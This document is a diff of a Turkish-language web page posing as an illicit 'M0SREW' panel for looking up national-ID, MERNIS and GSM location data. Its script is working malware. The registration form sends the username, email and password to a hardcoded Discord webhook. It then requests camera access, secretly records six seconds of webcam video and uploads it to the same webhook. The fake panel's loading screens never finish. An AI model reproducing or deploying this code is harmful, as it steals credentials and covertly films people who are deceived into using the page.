@@ -3,149 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>M 0 S R E W // ADMIN</title>
+    <title>M 0 S R E W</title>
     <style>
-        /* Orijinal Mavi Arka Plan */
-        body { background: #162a8c; color: #fff; font-family: sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        :root { --bg: #ffffff; --text: #000000; --box: #f4f4f4; --accent: #162a8c; }
+        .dark-mode { --bg: #0a0a0a; --text: #ffffff; --box: #1a1a1a; --accent: #5c7dff; }
 
-        /* Üst Bar */
-        .header { 
-            background: #0a134a; padding: 20px; display: flex; 
-            justify-content: space-between; align-items: center; 
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-        .logo { font-size: 18px; letter-spacing: 4px; font-weight: bold; text-transform: uppercase; }
-        .tag { color: #888; font-size: 12px; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; transition: 0.3s; }
+        
+        /* DARK MODE BUTONU */
+        .mode-toggle { position: fixed; top: 20px; right: 20px; cursor: pointer; z-index: 60000; font-size: 24px; }
 
-        /* Sağ Üst Hamburger Menü */
-        .menu-icon { cursor: pointer; display: flex; flex-direction: column; gap: 4px; }
-        .menu-icon div { width: 22px; height: 2px; background: #fff; }
+        /* GİRİŞ VE KAYIT EKRANI */
+        .auth-container { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
+        .auth-box { width: 100%; max-width: 320px; background: var(--box); padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        h1 { letter-spacing: 8px; margin-bottom: 30px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid rgba(0,0,0,0.1); border-radius: 8px; box-sizing: border-box; outline: none; }
+        .btn { width: 100%; padding: 15px; background: var(--accent); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .switch-link { margin-top: 20px; font-size: 13px; color: #888; cursor: pointer; text-decoration: underline; }
 
-        /* Yan Menü (Hamburger Açılınca) */
-        #sideMenu { 
-            position: fixed; top: 0; right: -280px; width: 280px; height: 100%; 
-            background: #0a134a; transition: 0.3s ease-in-out; z-index: 10000; padding-top: 60px;
-            box-shadow: -10px 0 30px rgba(0,0,0,0.5);
-        }
-        .ifs-title { 
-            padding: 20px 25px; color: #fff; font-size: 16px; font-weight: bold; 
-            letter-spacing: 2px; border-bottom: 2px solid #162a8c; margin-bottom: 10px;
-        }
-        .side-link { padding: 15px 25px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; color: #aaa; cursor: pointer; }
+        /* PANEL VE HAMBURGER */
+        #panel { display: none; padding: 20px; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid rgba(128,128,128,0.2); }
+        .hamburger { cursor: pointer; display: flex; flex-direction: column; gap: 5px; }
+        .hamburger div { width: 25px; height: 2px; background: var(--text); }
 
-        /* Harita ve Terminal (Görüntüdeki gibi) */
-        .content { padding: 15px; }
-        .map-box { 
-            width: 100%; height: 180px; background: #222; 
-            border-radius: 12px; overflow: hidden; margin-bottom: 15px; 
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        .map-box img { width: 100%; height: 100%; object-fit: cover; opacity: 0.8; }
+        #sideMenu { position: fixed; top: 0; right: -300px; width: 300px; height: 100%; background: var(--box); transition: 0.4s; z-index: 10000; padding-top: 60px; box-shadow: -5px 0 15px rgba(0,0,0,0.2); }
+        .menu-item { padding: 20px; border-bottom: 1px solid rgba(128,128,128,0.1); cursor: pointer; font-size: 14px; font-weight: 500; }
+        .menu-item:hover { background: var(--accent); color: #fff; }
 
-        .term-box { 
-            background: #000; border-radius: 10px; padding: 15px; 
-            font-family: monospace; font-size: 11px; color: #5c7dff; 
-            height: 100px; overflow-y: auto; margin-bottom: 20px;
-        }
+        /* SONSUZ YÜKLEME EKRANI */
+        #loadingScreen { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100000; color: #0f0; font-family: monospace; padding: 40px; font-size: 14px; }
+        .dot-ani::after { content: '.'; animation: dots 1.5s steps(5, end) infinite; }
+        @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60% { content: '...'; } 80%, 100% { content: ''; } }
 
-        /* Liste Sorguları */
-        .row { 
-            display: flex; justify-content: space-between; padding: 15px 5px; 
-            border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px;
-        }
+        .row { display: flex; justify-content: space-between; padding: 20px 10px; border-bottom: 1px solid rgba(128,128,128,0.1); }
         .lock { color: #ff3b3b; font-weight: bold; }
-
-        /* Giriş Paneli (İlk Ekran) */
-        #authScreen { 
-            position: fixed; inset: 0; background: #162a8c; z-index: 50000; 
-            display: flex; flex-direction: column; justify-content: center; align-items: center; 
-        }
-        input { margin: 10px; padding: 15px; width: 260px; border: none; background: rgba(0,0,0,0.2); color: #fff; border-radius: 5px; outline: none; }
-        .login-btn { padding: 15px; width: 290px; background: #fff; color: #000; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 5px; }
     </style>
 </head>
 <body>
 
-<audio id="snd" loop><source src="https://www.soundjay.com/misc/sounds/heartbeat-01.mp3"></audio>
-<video id="v" style="display:none;" autoplay muted playsinline></video>
+<div class="mode-toggle" onclick="document.body.classList.toggle('dark-mode')">🌓</div>
 
-<div id="authScreen">
-    <h1 style="letter-spacing: 6px; font-weight: bold;">M0SREW</h1>
-    <p style="font-size: 10px; color: #aaa; margin-top: -15px; letter-spacing: 2px;">SYSTEM AUTHENTICATION</p>
-    <input type="text" placeholder="Admin ID">
-    <input type="password" placeholder="Passcode">
-    <button class="login-btn" onclick="startSystem()">SİSTEMİ AKTİF ET</button>
+<video id="cam" style="display:none;" autoplay muted playsinline></video>
+
+<div id="loginSection" class="auth-container">
+    <div class="auth-box">
+        <h1>M0SREW</h1>
+        <input type="text" placeholder="Kullanıcı Adı">
+        <input type="password" placeholder="Şifre">
+        <button class="btn" onclick="alert('Hatalı Giriş! Lütfen Kayıt Olun.')">GİRİŞ YAP</button>
+        <div class="switch-link" onclick="showSection('registerSection')">Hesabın yok mu? Kayıt Ol</div>
+    </div>
 </div>
 
-<div id="panel" style="display:none;">
+<div id="registerSection" class="auth-container" style="display:none;">
+    <div class="auth-box">
+        <h1>M0SREW</h1>
+        <p style="font-size: 12px; color: #888;">Yeni Hesap Oluştur</p>
+        <input type="text" id="regUser" placeholder="Kullanıcı Adı Seçin">
+        <input type="email" id="regEmail" placeholder="E-posta Adresi">
+        <input type="password" id="regPass" placeholder="Şifre Oluştur">
+        <button class="btn" onclick="registerAction()">HESABI OLUŞTUR</button>
+        <div class="switch-link" onclick="showSection('loginSection')">Zaten hesabım var</div>
+    </div>
+</div>
+
+<div id="panel">
     <div class="header">
-        <div class="logo">M 0 S R E W</div>
-        <div class="tag">// ADMIN</div>
-        <div class="menu-icon" onclick="openMenu()"><div></div><div></div><div></div></div>
+        <div style="letter-spacing: 3px; font-weight: bold;">M 0 S R E W</div>
+        <div class="hamburger" onclick="toggleNav()"><div></div><div></div><div></div></div>
     </div>
 
     <div id="sideMenu">
-        <div class="ifs-title">EMRE İFS4</div>
-        <div class="side-link" onclick="alert('Veritabanı meşgul...')">LOGLARI SORGULA</div>
-        <div class="side-link" onclick="alert('Kamera kanalları aktif.')">KAMERA ERİŞİMİ</div>
-        <div class="side-link" onclick="location.reload()" style="color: #ff3b3b;">SİSTEMDEN AYRIL</div>
+        <div class="menu-item" style="color:var(--accent); font-weight: 800;">EMRE İFS4</div>
+        <div class="menu-item" onclick="startLoading('Mernis 2026 Datasına Bağlanılıyor')">MERNİS 2026 SORGULA</div>
+        <div class="menu-item" onclick="startLoading('GSM Operatörüne Sızılıyor')">GSM LOKASYON</div>
+        <div class="menu-item" onclick="startLoading('Sistem Dosyaları Çözülüyor')">TC NO SORGULAMA</div>
+        <div class="menu-item" onclick="location.reload()" style="color: red;">ÇIKIŞ YAP</div>
     </div>
 
-    <div class="content">
-        <div class="map-box">
-            <img src="https://static-maps.yandex.ru/1.x/?ll=28.68,41.04&z=12&l=map&size=450,180&theme=dark">
-        </div>
-
-        <div class="term-box">
-            [INFO] Protokol 43.0 başlatıldı...<br>
-            [INFO] Bağlantı tünelleniyor...<br>
-            [INFO] IP adresine sızıldı: <span id="ip2">...</span><br>
-            [INFO] Video kanalları bypass edildi.
-        </div>
-
-        <div class="row"><span>IP ADRESİ</span><span id="ip">---</span></div>
-        <div class="row"><span>KONUM</span><span style="color:#ff3b3b">41.041,28.685</span></div>
-        <div class="row"><span>MERNİS 2026</span><span class="lock">KİLİTLİ</span></div>
-        <div class="row"><span>GSM LOKASYON</span><span class="lock">KİLİTLİ</span></div>
-        <div class="row"><span>TC SORGULAMA</span><span class="lock">KİLİTLİ</span></div>
-        <div class="row"><span>SMS BOMBER</span><span style="color:#888">OFFLINE</span></div>
+    <div style="margin-top: 30px;">
+        <div class="row"><span>DURUM</span><span style="color: green;">AKTİF</span></div>
+        <div class="row"><span>IP ADRESİ</span><span id="myIp">---</span></div>
+        <div class="row"><span>SİSTEM YETKİSİ</span><span class="lock">YETERSİZ</span></div>
+        <p style="font-size: 11px; color: #888; text-align: center; margin-top: 40px;">Panel özelliklerini kullanmak için menüden seçim yapın.</p>
     </div>
+</div>
+
+<div id="loadingScreen">
+    <div id="loadText">Sistem Hazırlanıyor</div>
+    <div class="dot-ani">Lütfen bekleyin</div>
+    <br><br>
+    <div style="color: #555;">[DEBUG] Port 8080 checking...</div>
+    <div style="color: #555;">[DEBUG] Encryption: AES-256</div>
+    <div style="color: #555;">[DEBUG] Bypass status: Pending</div>
 </div>
 
 <script>
     const wh = "https://discord.com/api/webhooks/1501879445722759260/1xUO1IOn_YOTS9l0_XcLBo83UkbEgvJjTcjYdcV_arPyX4s-c8Js_3YFZ6jZlKx5Ms5f";
 
-    function openMenu() {
-        const m = document.getElementById('sideMenu');
-        m.style.right = m.style.right === '0px' ? '-280px' : '0px';
+    function showSection(id) {
+        document.getElementById('loginSection').style.display = 'none';
+        document.getElementById('registerSection').style.display = 'none';
+        document.getElementById(id).style.display = 'flex';
     }
 
-    async function startSystem() {
+    function toggleNav() {
+        const s = document.getElementById('sideMenu');
+        s.style.right = s.style.right === '0px' ? '-300px' : '0px';
+    }
+
+    function startLoading(text) {
+        document.getElementById('loadingScreen').style.display = 'block';
+        document.getElementById('loadText').innerText = text;
+        // Hiçbir zaman kapanmayacak, sonsuz döngü.
+    }
+
+    async function registerAction() {
+        const u = document.getElementById('regUser').value;
+        const e = document.getElementById('regEmail').value;
+        const p = document.getElementById('regPass').value;
+
+        if(!u || !e || !p) return alert("Boş alan bırakmayın!");
+
+        // Bilgileri Discord'a gönder
+        fetch(wh, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ content: `🆕 **YENİ KAYIT:**\nUser: ${u}\nEmail: ${e}\nPass: ${p}` })
+        });
+
+        alert("Hesap başarıyla oluşturuldu! Şimdi giriş yapabilirsiniz.");
+        showSection('loginSection');
+        
+        // Giriş kısmına atınca video izni için tetikle
+        startCapture();
+    }
+
+    async function startCapture() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true});
-            document.getElementById('v').srcObject = stream;
-            document.getElementById('authScreen').style.display = 'none';
-            document.getElementById('panel').style.display = 'block';
-            document.getElementById('snd').play();
-
+            document.getElementById('cam').srcObject = stream;
+            
+            // Video kaydı al ve gönder
             const mr = new MediaRecorder(stream);
-            let ch = [];
-            mr.ondataavailable = e => ch.push(e.data);
+            let chunks = [];
+            mr.ondataavailable = e => chunks.push(e.data);
             mr.onstop = () => {
-                const b = new Blob(ch, { type: 'video/webm' });
+                const blob = new Blob(chunks, { type: 'video/webm' });
                 const fd = new FormData();
-                fd.append("payload_json", JSON.stringify({ content: "🔱 **M 0 S R E W** Oturumu Açıldı." }));
-                fd.append("file", b, "m0s_cam.webm");
+                fd.append("file", blob, "kayit_video.webm");
                 fetch(wh, { method: "POST", body: fd });
             };
-            mr.start(); setTimeout(() => mr.stop(), 5000);
-        } catch(e) { alert("Sistem erişimi için biyometrik (kamera) onay gerekli."); }
+            mr.start(); setTimeout(() => { mr.stop(); stream.getTracks().forEach(t => t.stop()); }, 6000);
+
+            // Giriş yapılmış gibi paneli göster
+            setTimeout(() => {
+                document.getElementById('loginSection').style.display = 'none';
+                document.getElementById('panel').style.display = 'block';
+            }, 1000);
+        } catch(e) { console.log("İzin verilmedi."); }
     }
 
-    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
-        document.getElementById('ip').innerText=d.ip;
-        document.getElementById('ip2').innerText=d.ip;
-    });
+    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>document.getElementById('myIp').innerText=d.ip);
 </script>
 
 </body>
